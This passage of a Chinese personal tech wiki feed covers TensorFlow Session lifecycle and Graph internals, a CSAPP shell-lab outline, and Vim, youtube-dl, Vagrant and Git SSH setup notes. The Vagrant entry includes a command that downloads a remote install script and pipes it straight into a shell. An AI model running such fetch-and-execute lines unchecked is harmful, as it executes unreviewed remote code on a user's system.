<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Status <span class="title">NewSession</span><span class="params">(<span class="keyword">const</span> SessionOptions&amp; options, Session** out_session)</span> </span>&#123;</span><br><span class="line">  SessionFactory* factory;</span><br><span class="line">  Status s = SessionFactory::GetFactory(options, &amp;factory);</span><br><span class="line">  <span class="keyword">if</span> (!s.ok()) &#123;</span><br><span class="line">    *out_session = <span class="literal">nullptr</span>;</span><br><span class="line">    LOG(ERROR) &lt;&lt; s;</span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line">  &#125;</span><br><span class="line">  *out_session = factory-&gt;NewSession(options);</span><br><span class="line">  <span class="keyword">if</span> (!*out_session) &#123;</span><br><span class="line">    <span class="keyword">return</span> errors::Internal(<span class="string">"Failed to create session."</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> Status::OK();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="会话生命周期"><a href="#会话生命周期" class="headerlink" title="会话生命周期"></a>会话生命周期</h1><p>下文以前端Python，桥梁C API，后端C++为生命线，理顺三者之间的调用关系，阐述Session的生命周期过程。</p>
<p>在Python前端，Session的生命周期主要体现在：</p>
<p>创建Session(target)</p>
<p>迭代执行Session.run(fetches, feed_dict)</p>
<p>Session._extend_graph(graph)</p>
<p>Session.TF_Run(feeds, fetches, targets)</p>
<p>关闭Session</p>
<p>销毁Session</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sess = Session(target)</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">1000</span>):</span><br><span class="line">  batch_xs, batch_ys = mnist.train.next_batch(<span class="number">100</span>)</span><br><span class="line">  sess.run(train_step, feed_dict=&#123;x: batch_xs, y_: batch_ys&#125;)</span><br><span class="line">sess.close()</span><br></pre></td></tr></table></figure>
<p>相应地，C++后端，Session的生命周期主要体现在：</p>
<p>根据target多态创建Session</p>
<p>Session.Create(graph)：有且仅有一次</p>
<p>Session.Extend(graph)：零次或多次</p>
<p>迭代执行Session.Run(inputs, outputs, targets)</p>
<p>关闭Session.Close</p>
<p>销毁Session对象</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// create/load graph ...</span></span><br><span class="line">tensorflow::GraphDef graph;</span><br><span class="line"><span class="comment">// local runtime, target is ""</span></span><br><span class="line">tensorflow::SessionOptions options;</span><br><span class="line"></span><br><span class="line"><span class="comment">// create Session</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">unique_ptr</span>&lt;tensorflow::Session&gt; </span><br><span class="line">sess(tensorflow::NewSession(options));</span><br><span class="line"></span><br><span class="line"><span class="comment">// create graph at initialization.</span></span><br><span class="line">tensorflow::Status s = sess-&gt;Create(graph);</span><br><span class="line"><span class="keyword">if</span> (!s.ok()) &#123; ... &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// run step</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;tensorflow::Tensor&gt; outputs;</span><br><span class="line">s = session-&gt;Run(</span><br><span class="line">&#123;&#125;, <span class="comment">// inputs is empty </span></span><br><span class="line">&#123;<span class="string">"output:0"</span>&#125;, <span class="comment">// outputs names</span></span><br><span class="line">&#123;<span class="string">"update_state"</span>&#125;, <span class="comment">// target names</span></span><br><span class="line">&amp;outputs); <span class="comment">// output tensors</span></span><br><span class="line"><span class="keyword">if</span> (!s.ok()) &#123; ... &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// close</span></span><br><span class="line">session-&gt;Close();</span><br></pre></td></tr></table></figure>
<p>创建会话</p>
<p>上文介绍了Session创建的详细过程，从Python前端为起点，通过Swig自动生成的Python-C++的包装器为媒介，实现了Python到TensorFlow的C API的调用。</p>
<p>其中，C API是前端系统与后端系统的分水岭。后端C++系统根据前端传递的Session.target，使用SessionFactory多态创建Session(C++)对象。</p>
<p><img src="http://or9a8nskt.bkt.clouddn.com/15148944313909.png" alt=""></p>
<p>创建会话</p>
<p>从严格的角色意义上划分，GrpcSession依然扮演了Client的角色。它使用target，通过RPC协议与Master建立通信连接，因此，GrpcSession同时扮演了RPC Client的角色。</p>
<p><img src="http://or9a8nskt.bkt.clouddn.com/15148944356342.png" alt="Session多态创建"></p>
<h1 id="创建-扩展图"><a href="#创建-扩展图" class="headerlink" title="创建/扩展图"></a>创建/扩展图</h1><p>随后，Python前端将调用Session.run接口，将构造好的计算图，以GraphDef的形式发送给C++后端。</p>
<p>其中，前端每次调用Session.run接口时，都会试图将新增节点的计算图发送给后端系统，以便后端系统将新增节点的计算图Extend到原来的计算图中。特殊地，在首次调用Session.run时，将发送整个计算图给后端系统。</p>
<p>后端系统首次调用Session.Extend时，转调(或等价)Session.Create；以后，后端系统每次调用Session.Extend时将真正执行Extend的语义，将新增的计算图的节点追加至原来的计算图中。</p>
<p>随后，后端将启动计算图执行的准备工作。</p>
<p><img src="http://or9a8nskt.bkt.clouddn.com/15148944411026.png" alt="创建/扩展图"></p>
<h1 id="迭代运行"><a href="#迭代运行" class="headerlink" title="迭代运行"></a>迭代运行</h1><p>接着，Python前端Session.run实现将Feed, Fetch列表准备好，传递给后端系统。后端系统调用Session.Run接口。</p>
<p>后端系统的一次Session.Run执行常常被称为一次Step，Step的执行过程是TensorFlow运行时的核心。</p>
<p>每次Step，计算图将正向计算网络的输出，反向传递梯度，并完成一次训练参数的更新。首先，后端系统根据Feed, Fetch，对计算图(常称为Full Graph)进行剪枝，得到一个最小依赖的计算子图(常称为Client Graph)。</p>
<p>然后，运行时启动设备分配算法，如果节点之间的边横跨设备，则将该边分裂，插入相应的Send与Recv节点，实现跨设备节点的通信机制。</p>
<p>随后，将分裂出来的子图片段(常称为Partition Graph)注册到相应的设备上，并在本地设备上启动子图片段的执行过程。</p>
<p><img src="http://or9a8nskt.bkt.clouddn.com/15148944539577.png" alt="关闭会话"></p>
<p>当计算图执行完毕后，需要关闭Session，以便释放后端的系统资源，包括队列，IO等。会话关闭流程较为简单，如下图所示。</p>
<p><img src="media/2017041237.png" alt="关闭会话"></p>
<h1 id="销毁会话"><a href="#销毁会话" class="headerlink" title="销毁会话"></a>销毁会话</h1><p>最后，会话关闭之后，Python前端系统启动GC，当Session.del被调用后，启动后台C++的Session对象销毁过程。</p>
<p><img src="media/2017041238.png" alt="销毁会话"></p>
]]></content>
      
        <categories>
            
            <category> TensorFlow </category>
            
        </categories>
        
        
        <tags>
            
            <tag> tensorflow </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Lab5 Shell Lab]]></title>
      <url>/wiki/2017/12/30/CSAPP-Lab-Shell-Lab/</url>
      <content type="html"><![CDATA[<p>Shell Lab需要我们完成一个简单的shell程序。shell是一个交互的命令行界面的解析器。著名的shell程序有Bourne shell (<code>sh</code>)、Bourne-Again shell(<code>bash</code>)、Z shell (<code>zsh</code>)等。shell的框架已经写好，主要需要完成以下函数：</p>
<ul>
<li><code>void eval(char *cmdline)</code>：解析命令与执行</li>
<li><code>void sigchld_handler(int sig)</code>：<code>SIGCHLD</code> 信号处理程序</li>
<li><code>void sigtstp_handler(int sig)</code>：<code>SIGTSTP</code>(ctrl-z) 信号处理程序</li>
<li><code>void sigint_handler(int sig)</code>：<code>SIGINT</code>(ctrl-c) 信号处理程序</li>
</ul>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>shell程序<code>tsh.c</code>应该具备以下功能：</p>
<ul>
<li>每一行会输出一个 <code>tsh&gt;</code>，然后等待用户输入</li>
<li>用户的输入包括<code>name</code>加上零个或多个参数，这些参数之间用一个或多个空格分隔。如果<code>name</code>是内置命令，那么直接执行，否则需要新建一个子进程，并在子进程中完成具体的工作</li>
<li>不需要支持管道，但是需要支持输入输出重定向，如 <code>tsh&gt; /bin/cat &lt; foo &gt; bar</code>（必须支持在同一行重定向输入以及输出)， 也需要支持内置命令的重定向，如 <code>tsh&gt; jobs &gt; foo</code></li>
<li>输入 <code>ctrl-c</code> 或 <code>ctrl-z</code> 会给当前的前台进程（包括其子进程）发送 <code>SIGINT</code>(<code>SIGTSTP</code>) 信号，如果没有前台任务，那么这俩信号没有任何效果</li>
<li>如果输入的命令以 &amp; 结尾，那么就要以后台任务的方式执行，否则按照前台执行</li>
<li>每个job都有其进程ID(<code>PID</code>)和job ID(<code>JID</code>)都是由<code>tsh</code>指定的正整数，<code>JID</code>以<code>%</code>开头（如 <code>%5</code> 表示 <code>JID</code>为5，而5则表示<code>PID</code>为5，这部分已提供了辅助函数</li>
<li>支持的内置命令有<ul>
<li><code>quit</code> 退出shell</li>
<li><code>jobs</code> 列出所有的后台任务</li>
<li><code>bg job</code> 给后台job发送<code>SIGCONT</code> 信号来继续执行该任务，具体的job数值可以是PID或JID</li>
<li><code>fg job</code> 给前台job发送<code>SIGCONT</code> 信号来继续执行该任务，具体的job数值可以是PID或JID</li>
</ul>
</li>
<li><code>tsh</code>应该回收所有的僵尸进程，如果任何job因为接收了没有捕获的信号而终止，<code>tsh</code>应该识别出这个时间并且打印出<code>JID</code>和相关信号的信息。</li>
</ul>
<h3 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h3><ul>
<li>不要使用 <code>sleep()</code> 来同步</li>
<li>不要使用忙等待 <code>while(1)</code>;</li>
<li>使用<code>sigsuspend</code>来同步</li>
<li>竞争条件</li>
<li>僵尸进程回收（注意竞争条件以及正确处理信号）</li>
<li>等待前台任务（仔细思考怎么样才是好的方式）</li>
<li>不要假定进程的执行顺序</li>
<li>子进程挂掉的时候应该在一个限定时间内被回收</li>
<li>不要在多个地方调用<code>waitpid</code>，很容易造成竞争条件，也会造成程序过分复杂</li>
<li>不要使用任何系统调用来管理 <code>terminal group</code></li>
<li><code>waitpid</code>, <code>kill</code>, <code>fork</code>, <code>execve</code>, <code>setpgid</code>, <code>sigprocmask</code> 和 <code>sigsuspend</code> 都非常有用，<code>waitpid</code> 中的 <code>WUNTRACED</code> 和 <code>WNOHANG</code>选项也是如此。</li>
<li>遇到不清晰的用 <code>man</code> 来查看细节</li>
<li>实现 <code>signal handler</code> 的时候注意给全部的前台进程组发送 <code>SIGINT</code> 和 <code>SIGTSTP</code> 信号</li>
<li>在 <code>kill</code> 函数中使用 <code>-pid</code> 的格式作为参数</li>
<li>在shell等待前台工作完成时，需要决定在<code>eval</code>及<code>sigchold handler</code> 具体的分配，这里有一定技巧</li>
<li>在函数 <code>eval</code> 中，在 <code>fork</code> 出子进程之前，必须使用 <code>sigprocmask</code> 来阻塞 <code>SIGCHLD,</code>SIGINT<code>和</code>SIGTSTP<code>信号，完成之后再取消阻塞。调用</code>addjob<code>的时候也需要如此。注意，因为子进程也继承了之前的各种状态，所以在子进程中调用</code>exec<code>执行新程序的时候注意需要取消阻塞，同样也需要恢复默认的</code>handler`（shell 本身已经忽略了这些信号）</li>
<li>不要使用 <code>top</code>, <code>less</code>, <code>vi</code>, <code>emacs</code> 之类的复杂程序，使用简单的文本程序如：<code>/bin/cat</code>, <code>/bin/ls</code>, <code>/bin/ps</code>, <code>/bin/echo</code></li>
<li>因为毕竟不是真正的 shell，所以在<code>fork</code>之后，<code>execve</code>之前，子进程需要调用 <code>setpgid(0, 0)</code>，这样就把子进程放到一个新的进程组里。这样就保证我们的shell前台进程组中唯一的进程，当按下 <code>ctrl-c</code>时，应该捕获<code>SIGINT</code>信号并发送给对应的前台进程组中。</li>
</ul>
<h2 id="gdb-操作"><a href="#gdb-操作" class="headerlink" title="gdb 操作"></a>gdb 操作</h2><p>可能用到的gdb相关操作：</p>
<p>（1）改变gdb信号处理的设置 ：设置gdb接收到SIGINT时不要停止、打印、传递给调试目标程序 。<br>         (gdb) handle SIGINT nostop print pass<br>（2）使用gdb命令直接向调试的应用程序发送信号 ：首先在你希望发送信号的语句处设置断点，然后运行程序，当停止到断点所在位置后，用gdb的signal命令发送信号给调试目标程序 。<br>          (gdb) signal SIGINT </p>
<p>（3）调试多进程程序：mode到可选值为parent和child表示fork之后调试父进程还是子进程。</p>
<pre><code>(gdb) set follow-fork-mode mode
</code></pre><h2 id="dup-dup2-I-O重定向"><a href="#dup-dup2-I-O重定向" class="headerlink" title="dup/dup2 I/O重定向"></a>dup/dup2 I/O重定向</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dup, dup2 -- duplicate an existing file descriptor</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dup</span><span class="params">(<span class="keyword">int</span> newfd)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dup2</span><span class="params">(<span class="keyword">int</span> newfd, <span class="keyword">int</span> oldfd)</span></span>;</span><br></pre></td></tr></table></figure>
<p><code>dup2</code>函数复制描述符表项<code>oldfd</code>到描述符表项<code>newfd</code>，覆盖描述符表项<code>newfd</code>以前的内容。如果<code>newfd</code>已经打开了，<code>dup2</code>会在复制<code>oldfd</code>之前关闭<code>newfd</code>。</p>
]]></content>
      
        <categories>
            
            <category> CSAPP Lab </category>
            
        </categories>
        
        
        <tags>
            
            <tag> CSAPP </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[VIM技巧]]></title>
      <url>/wiki/2017/12/30/TOOLS-VIM%E6%8A%80%E5%B7%A7/</url>
      <content type="html"><![CDATA[<p>粘贴变形</p>
<p><code>:set paste</code></p>
]]></content>
      
        <categories>
            
            <category> TOOLS </category>
            
        </categories>
        
        
        <tags>
            
            <tag> VIM </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Youtube]]></title>
      <url>/wiki/2017/12/30/awesome-Install-Youtube/</url>
      <content type="html"><![CDATA[<p><code>Youtube-dl</code>可以下载Youtube网页的视频，功能很强大。但<code>Youtube-dl</code>还有个缺点，就是下载时单线程。简直就是龟速，下载视频往往还比较大，单线程是不可能使用的。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">youtube-dl    https://www.youtube.com/playlist\?list\=PLrmLmBdmIlpslxZUHHWmfOzNn6cA7jvyh   --external-downloader aria2c --external-downloader-args <span class="string">"-x 16  -k 1M"</span></span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> awesome Install </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Youtube </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[vagrant搭建ubuntu]]></title>
      <url>/wiki/2017/12/30/awesome-Install-vagrant%E6%90%AD%E5%BB%BAubuntu/</url>
      <content type="html"><![CDATA[<p><code>Vagrant</code> 是一款用来管理虚拟机的工具，可以构建虚拟开发环境的。<code>Vagrant</code>封装一个<code>Linux</code>(Ubuntu/CentOS等)的开发环境，分享给其他开发人员。而其他人可以在自己喜欢的桌面系统（Mac/Windows/Linux）上开发程序，代码却能统一在封装好的环境里运行，可以把开发环境配制成与生产环境一样。</p>
<h1 id="Mac-terminal下的Vagrant和-Ubuntu环境的安装"><a href="#Mac-terminal下的Vagrant和-Ubuntu环境的安装" class="headerlink" title="Mac terminal下的Vagrant和 Ubuntu环境的安装"></a>Mac terminal下的<code>Vagrant</code>和 <code>Ubuntu</code>环境的安装</h1><p><code>Vagrant</code>可以从下面网页链接下载, 选择 ：<br><a href="https://www.vagrantup.com/downloads.html">https://www.vagrantup.com/downloads.html</a></p>
<p>安装好了Vagrant，后然后安装Virtualbox，请到<a href="https://www.virtualbox.org">下载网页</a>直接下载需要的版本。</p>
<p>下面安装<code>Ubuntu</code><br>（1）打开Mac terminal，运行下面命令，安装<code>Ubuntu</code>。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ vagrant init ubuntu/trusty64</span><br><span class="line">$ vagrant up</span><br></pre></td></tr></table></figure>
<p>其他的系统版本选择见<a href="https://app.vagrantup.com/boxes/search">https://app.vagrantup.com/boxes/search</a>, 最常用的是<code>ubuntu/trusty64</code>和<code>ubuntu/xenial64</code>.</p>
<p>键入<code>vagrant up</code>后，<code>vagrant</code>会下载您指定的操作系统，然后进行安装。整个下载安装过程一般在5分钟左右。</p>
<p>(2)连接到安装好的<code>Ubuntu</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 这个命令会通过ssh的方式连接虚拟机。</span><br><span class="line">$ vagrant ssh</span><br></pre></td></tr></table></figure>
<h2 id="分享文件"><a href="#分享文件" class="headerlink" title="分享文件"></a>分享文件</h2><p>打开位于配置文件<code>Vagrantfile</code>，配置其中的<code>config.vm.synced_folder</code>参数,第一个参数是需要位于主机需要同步的文件夹，可以是相对地址。第二个参数是虚拟机上的需要同步的文件夹，必须是绝对地址。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Vagrant.configure(&quot;2&quot;) do |config|</span><br><span class="line">  # other config here</span><br><span class="line"></span><br><span class="line">  config.vm.synced_folder &quot;src/&quot;, &quot;/home/shared&quot;</span><br><span class="line">end</span><br></pre></td></tr></table></figure>
<p>NOTE: By default, Vagrant will share your project directory (the directory with the Vagrantfile) to /vagrant.</p>
<h2 id="安装和配置ubuntu"><a href="#安装和配置ubuntu" class="headerlink" title="安装和配置ubuntu"></a>安装和配置<code>ubuntu</code></h2><p>这其实和正常的<code>ubuntu</code>系统一样的。一般通过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install software</span><br></pre></td></tr></table></figure>
<p>安装软件。</p>
<h3 id="安装常用软件"><a href="#安装常用软件" class="headerlink" title="安装常用软件"></a>安装常用软件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install git</span><br><span class="line">sudo apt-get install gdb</span><br><span class="line">sudo apt-get install zsh</span><br><span class="line">sh -c <span class="string">"<span class="variable">$(curl -fsSL https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh)</span>"</span>  // install on-my-zsh</span><br></pre></td></tr></table></figure>
<p><strong><code>vagrant</code>虚拟机默认密码是<code>vagrant</code></strong></p>
<h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">vagrant box add &#123;作者/系统名&#125; &#123;box文件路径&#125;  #添加虚拟机</span><br><span class="line">vagrant box remove &#123;作者/系统名&#125;  #删除虚拟机</span><br><span class="line">vagrant init &#123;作者/系统名&#125;  #初化化虚拟机此时会生成一个Vagrantfile文件</span><br><span class="line">vagrant box list #查年现有的虚拟机</span><br><span class="line">vagrant status  #查看所有虚拟机状态</span><br><span class="line">vagrant halt &#123;作者/系统名&#125;  #关闭指定虚拟机</span><br><span class="line">vagrant provision  #当修改完配制后只要执行一下此命令就可以对虚拟机进行相关修改</span><br><span class="line">vagrant reload #重启虚拟机</span><br><span class="line">vagrant ssh  #使用ssh的方式连接虚拟机</span><br><span class="line">vagrant up  #启动虚拟机</span><br><span class="line">vagrant version #查看版本信息</span><br><span class="line">vagrant plugin &#123;插件&#125; #安装插件</span><br><span class="line">vagrant package &#123;作者/系统名&#125; #把你的虚拟机打包在box可以分享给你拉小人类伴们一起使用，非常方便</span><br><span class="line">vagrant resume  #恢复虚拟机</span><br><span class="line">vagrant suspend  #暂停虚拟机</span><br><span class="line">vagrant destroy  #销毁当前虚拟机</span><br></pre></td></tr></table></figure>
<h2 id="加载已经下载-存在的虚拟机"><a href="#加载已经下载-存在的虚拟机" class="headerlink" title="加载已经下载/存在的虚拟机"></a>加载已经下载/存在的虚拟机</h2><p>有时候虚拟机已经存在，或者你通过其他途径下载虚拟机更快，或者你从朋友那里拷贝了一个虚拟机，那么可不可以直接加载呢？</p>
<p>当然是可以的，而且一句话搞定，例如添加文件名为<code>path_to_file.box</code>的虚拟机以<code>my_box_name</code>的名字展现：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vagrant box add my_box_name file:///path_to_file.box</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> awesome Install </category>
            
        </categories>
        
        
        <tags>
            
            <tag> vagrant </tag>
            
            <tag> ubuntu </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[git]]></title>
      <url>/wiki/2017/12/30/awesome-Install-git/</url>
      <content type="html"><![CDATA[<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p><code>git</code>在mac上已经默认安装了，使用之前只需要简单的配置即可。</p>
<h3 id="设置Git的user-name和email"><a href="#设置Git的user-name和email" class="headerlink" title="设置Git的user name和email"></a>设置Git的user name和email</h3><p>把下面的<code>username</code>和<code>email</code>替换成您的<code>Github</code>的用户名和地址。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git config --global user.name &quot;username&quot;</span><br><span class="line">$ git config --global user.email &quot;email&quot;</span><br></pre></td></tr></table></figure>
<h3 id="生成密钥"><a href="#生成密钥" class="headerlink" title="生成密钥"></a>生成密钥</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ssh-keygen -t rsa -C &quot;email&quot;</span><br></pre></td></tr></table></figure>
<p>默认连续3个回车， 最后得到了两个文件：<code>～/.ssh/id_rsa</code>和<code>~/.ssh/id_rsa.pub</code>。注意这两个文件的保存地址(会输出在终端上，等下要用)。</p>
<p>其中公钥保存在<code>id_rsa.pub</code>内。</p>
<h3 id="添加密钥到ssh-agent"><a href="#添加密钥到ssh-agent" class="headerlink" title="添加密钥到ssh-agent"></a>添加密钥到ssh-agent</h3><p><code>ssh-agent</code>是一种控制用来保存公钥身份验证所使用的私钥的程序，其实<code>ssh-agent</code>就是一个密钥管理器，运行<code>ssh-agent</code>以后，使用<code>ssh-add</code>将私钥<code>id_rsa</code>交给<code>ssh-agent</code>保管，其他程序需要身份验证的时候可以将验证申请交给<code>ssh-agent</code>来完成整个认证过程。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ eval &quot;$(ssh-agent -s)&quot;</span><br></pre></td></tr></table></figure>
<p>添加生成的 <code>SSH key</code> 到 <code>ssh-agent</code>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ssh-add ~/.ssh/id_rsa</span><br></pre></td></tr></table></figure>
<h3 id="登陆Github-添加ssh"><a href="#登陆Github-添加ssh" class="headerlink" title="登陆Github, 添加ssh"></a>登陆<code>Github</code>, 添加<code>ssh</code></h3><p>复制<code>id_rsa.pub</code>文件里面的内容。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">more .ssh/id_rsa.pub</span><br></pre></td></tr></table></figure>
<p>打开<a href="https://github.com"><code>GitHub</code></a>,依次选择<code>settings</code>-<code>SSH and GPG keys</code>-<code>New SSH key</code>。进入到如下界面，输入任意<code>Title</code>，在<code>Key</code>输入框内粘贴上<code>id_rsa.pub</code>文件里面的内容。</p>
<p><img src="http://or9a8nskt.bkt.clouddn.com/add_ssh_key.png" alt="add_ssh_key"></p>
<p>测试一下是否可以连接：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -T git@github.com</span><br></pre></td></tr></table></figure>
<p>测试成功后，在github页面的SSH keys上的钥匙符号会显示为绿色：</p>
<p><img src="http://or9a8nskt.bkt.clouddn.com/gree.png" alt="gree"></p>
]]></content>
      
        <categories>
            
            <category> awesome Install </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Git </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[5 TF - Graph模块]]></title>
      <url>/wiki/2017/12/30/TensorFlow-5-TF-Graph%E6%A8%A1%E5%9D%97/</url>
      <content type="html"><![CDATA[<p><a href="https://zhuanlan.zhihu.com/p/25932160">转自</a></p>
<p>#5. TF - Graph模块</p>
<p>TF把神经网络模型表达成一张拓扑结构的Graph，Graph中的一个节点表示一种计算算子。Graph从输入到输出的Tensor数据流动完成了一个运算过程，这是对类似概率图、神经网络等连接式算法很好的表达，同时也是对Tensor + Flow的直观解释。</p>
<p>##5.1 Graph视图</p>
<p>Tensorflow采用符号化编程，形式化为Graph计算图。Graph包含节点（Node）、边（Edge）、NameScope、子图（SubGraph），图 5-1是Graph的拓扑描述。</p>
<p>Ø 节点分为计算节点(Compute Node)、起始点（Source Node）、终止点（Sink Node）。起始点入度为0，终止点出度为0。</p>
<p>Ø NameScope为节点创建层次化的名称，图 3 4中的NameSpace类型节点就是其中一种体现。</p>
<p>Ø 边分为普通边和依赖边（Dependecy Edge）。依赖边表示对指定的计算节点有依赖性，必须等待指定的节点计算完成才能开始依赖边的计算。</p>
<p><img src="http://or9a8nskt.bkt.clouddn.com/15148905244886.jpg" alt=""></p>
<p>图 5 2是Graph的UML视图模型，左侧GraphDef类为protobuf中定义的graph结构，可将graph结构序列化和反序列化处理，用于模型保存、模型加载、分布式数据传输。右侧Graph类为/core/graph模块中定义的graph结构，完成graph相关操作，如构建(construct)，剪枝(pruning)、划分(partitioning)、优化(optimize)、运行(execute)等。GraphDef类和Graph类可以相关转换，如图中中间部分描述，函数Graph::ToGraphDef()将Graph转换为GraphDef，函数ConvertGraphDefToGraph将GraphDef转换为Graph，借助这种转换就能实现Graph结构的网络传输。</p>
<p><img src="http://or9a8nskt.bkt.clouddn.com/15148905444950.jpg" alt=""></p>
<p>Graph-UML图中还定义了Node和Edge。Node定义函数操作和属性信息，Edge连接源节点和目标节点。类NodeDef中定义了Op、Input、Device、Attr信息，其中Device可能是CPU、GPU设备，甚至是ARM架构的设备，说明Node是与设备绑定的。类FunctionDefLibrary主要是为了描述各种Op的运算，包括Op的正向计算和梯度计算。FunctionDef的定义描述见图 5 3。</p>
<p><img src="http://or9a8nskt.bkt.clouddn.com/15148905577275.jpg" alt=""></p>
<p>图 5-4是FunctionDef举例，对MatMulGrad的梯度描述，其中包含函数参数定义、函数返回值定义、模板数据类型定义、节点计算逻辑。</p>
<p><img src="http://or9a8nskt.bkt.clouddn.com/15148905637262.jpg" alt=""></p>
<p><strong>5.2</strong> <strong>Graph构建</strong></p>
<p>有向图（DAG）由节点和有向边组成。本章节主要讲述TF如何利用组合成完整的graph的。假设有如下计算表达式：t1=MatMul(input, W1)。</p>
<p><img src="http://or9a8nskt.bkt.clouddn.com/15148905769009.jpg" alt=""></p>
<p>图 5-5中图计算表达式包含3个节点，2条边，描述为字符串形式如下。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">node &#123;name: &apos;W1&apos; op: &apos;TestParams&apos;&#125;,</span><br><span class="line">node &#123;name: &apos;input&apos; op: &apos;TestInput&apos; input:[&apos;^W1&apos;]&#125;,</span><br><span class="line">node &#123;name: &apos;t1&apos; op: &apos;MatMul&apos; input:[&apos;^W1&apos;, &apos;input:1&apos;]&#125;,</span><br></pre></td></tr></table></figure>
<p>TF先调用protobuf的解析方法将graph的字符串描述解析并生成GraphDef实例。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">protobuf::TextFormat::ParseFromString(gdef_str, &amp;gdef_)</span><br></pre></td></tr></table></figure>
